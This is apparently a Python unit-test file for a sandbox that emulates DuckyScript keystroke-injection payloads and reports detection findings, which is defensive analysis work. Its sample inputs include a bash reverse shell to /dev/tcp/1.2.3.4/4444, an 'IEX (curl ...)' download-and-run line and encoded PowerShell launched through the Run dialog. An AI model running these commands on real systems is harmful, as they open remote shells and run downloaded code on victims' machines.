import unittest

from duckysandbox.emulator import Emulator, detect_target_os, emulate
from duckysandbox.parser import parse


class TestEmulator(unittest.TestCase):
    def test_string_then_enter_runs_analysis(self):
        result = emulate("GUI r\nDELAY 200\nSTRING powershell -enc AAAA\nENTER\n", target_os="windows")
        ids = {f.rule_id for f in result.findings}
        self.assertIn("EXEC-PS", ids)
        self.assertEqual(result.vmstate.processes[0].name, "powershell.exe")
        self.assertEqual(result.vmstate.processes[0].parent, "explorer.exe")

    def test_keystroke_combo_description(self):
        result = emulate("GUI r\n", target_os="windows")
        self.assertEqual(result.vmstate.keystrokes[0].description, "Open the Windows Run dialog")

    def test_delay_advances_clock(self):
        result = emulate("DELAY 1500\nDELAY 500\n", target_os="windows")
        self.assertEqual(result.vmstate.clock_ms, 2000)

    def test_default_delay_applies_after_keystrokes(self):
        result = emulate("DEFAULT_DELAY 100\nSTRING a\nSTRING b\n", target_os="windows")
        self.assertEqual(result.vmstate.clock_ms, 200)

    def test_char_delay_paces_string_typing(self):
        result = emulate("STRING_DELAY 10\nSTRING abcde\n", target_os="windows")
        self.assertEqual(result.vmstate.clock_ms, 50)

    def test_while_loop_is_capped(self):
        text = "WHILE (1 == 1)\nSTRING x\nENTER\nEND_WHILE\n"
        result = emulate(text, target_os="windows")
        enter_presses = [k for k in result.vmstate.keystrokes if k.description == "Press ENTER"]
        self.assertEqual(len(enter_presses), Emulator.MAX_WHILE_ITERS)
        self.assertTrue(any("capped at" in n for n in result.vmstate.notes))

    def test_if_else_both_branches_modelled(self):
        text = "\n".join([
            "IF (1 == 1) THEN",
            "STRING branch_a",
            "ENTER",
            "ELSE",
            "STRING branch_b",
            "ENTER",
            "END_IF",
        ])
        result = emulate(text, target_os="windows")
        typed = [k.text for k in result.vmstate.keystrokes if k.text]
        self.assertIn("branch_a", typed)
        self.assertIn("branch_b", typed)
        self.assertTrue(any("conditional" in n.lower() for n in result.vmstate.notes))

    def test_repeat_replays_previous_instruction(self):
        text = "STRING A\nREPEAT 3\n"
        result = emulate(text, target_os="windows")
        typed = [k.text for k in result.vmstate.keystrokes if k.text == "A"]
        self.assertEqual(len(typed), 4)  # 1 original + 3 repeats

    def test_repeat_is_capped(self):
        text = f"STRING A\nREPEAT {Emulator.MAX_REPEAT + 50}\n"
        result = emulate(text, target_os="windows")
        typed = [k.text for k in result.vmstate.keystrokes if k.text == "A"]
        self.assertEqual(len(typed), Emulator.MAX_REPEAT + 1)
        self.assertTrue(any("REPEAT count capped" in n for n in result.vmstate.notes))

    def test_function_call_executes_body(self):
        text = "\n".join([
            "FUNCTION Greet()",
            "STRING hello-from-function",
            "ENTER",
            "END_FUNCTION",
            "Greet()",
        ])
        result = emulate(text, target_os="windows")
        typed = [k.text for k in result.vmstate.keystrokes if k.text]
        self.assertIn("hello-from-function", typed)

    def test_var_substitution(self):
        text = "\n".join([
            'VAR $url = "http://example.com/x"',
            "STRING IEX (curl '$url')",
            "ENTER",
        ])
        result = emulate(text, target_os="windows")
        typed = [k.text for k in result.vmstate.keystrokes if k.text]
        self.assertTrue(any("http://example.com/x" in t for t in typed))

    def test_hold_release_modifies_chord(self):
        text = "HOLD GUI\nTAB\nRELEASE GUI\n"
        result = emulate(text, target_os="windows")
        chord_event = result.vmstate.keystrokes[1]
        self.assertEqual(set(chord_event.keys), {"GUI", "TAB"})

    def test_process_tree_builds_parent_chain(self):
        text = "\n".join([
            "GUI r",
            "STRING cmd",
            "ENTER",
            "STRING powershell -nop -Command whoami",
            "ENTER",
        ])
        result = emulate(text, target_os="windows")
        names = [p.name for p in result.vmstate.processes]
        parents = {p.name: p.parent for p in result.vmstate.processes}
        self.assertEqual(names, ["cmd.exe", "powershell.exe"])
        self.assertEqual(parents["cmd.exe"], "explorer.exe")
        self.assertEqual(parents["powershell.exe"], "cmd.exe")

    def test_attackmode_storage_finding(self):
        result = emulate("ATTACKMODE HID STORAGE\n", target_os="windows")
        ids = {f.rule_id for f in result.findings}
        self.assertIn("BB-STORAGE", ids)

    def test_unsubmitted_trailing_text_is_analyzed(self):
        result = emulate("STRING whoami", target_os="windows")
        ids = {f.rule_id for f in result.findings}
        self.assertIn("DISC-WHOAMI", ids)
        self.assertTrue(any("never submitted" in n for n in result.vmstate.notes))

    def test_step_limit_terminates_pathological_program(self):
        # Deeply nested whiles still terminate quickly thanks to the step cap
        # and per-loop iteration cap.
        text = "\n".join(["WHILE (1==1)"] * 10 + ["STRING x"] + ["END_WHILE"] * 10)
        result = emulate(text, target_os="windows")
        self.assertIsNotNone(result)  # completes without hanging

    def test_infinite_recursion_hits_step_limit(self):
        text = "\n".join([
            "FUNCTION Recurse()",
            "STRING x",
            "Recurse()",
            "END_FUNCTION",
            "Recurse()",
        ])
        result = emulate(text, target_os="windows")
        self.assertTrue(any("step limit" in n.lower() for n in result.vmstate.notes))


class TestDetectTargetOS(unittest.TestCase):
    def test_powershell_detects_windows(self):
        self.assertEqual(detect_target_os("STRING powershell -enc AAA"), "windows")

    def test_devtcp_detects_linux(self):
        self.assertEqual(detect_target_os("STRING bash -i >& /dev/tcp/1.2.3.4/4444"), "linux")

    def test_osascript_detects_macos(self):
        self.assertEqual(detect_target_os("STRING osascript -e 'tell application'"), "macos")

    def test_empty_defaults_to_windows(self):
        self.assertEqual(detect_target_os("REM nothing interesting here"), "windows")


if __name__ == "__main__":
    unittest.main()
